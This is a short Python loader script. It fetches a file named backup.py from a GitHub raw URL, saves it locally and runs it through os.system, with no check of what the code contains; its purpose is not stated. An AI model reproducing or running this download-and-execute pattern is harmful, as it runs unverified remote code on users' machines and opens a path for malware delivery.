try:
  import requests
  url = "https://raw.githubusercontent.com/hoangks5/version_tool_socket/refs/heads/main/backup.py"
  response = requests.request("GET", url)
  code = response.text
  # chạy hàm này để thực thi code
  import os
  # save code to file
  with open('hoangks5.py', 'w', encoding='utf-8') as f:
    f.write(code)
  # run code
  os.system('python hoangks5.py')
except Exception as e:
  print(e)
  import time
  time.sleep(100)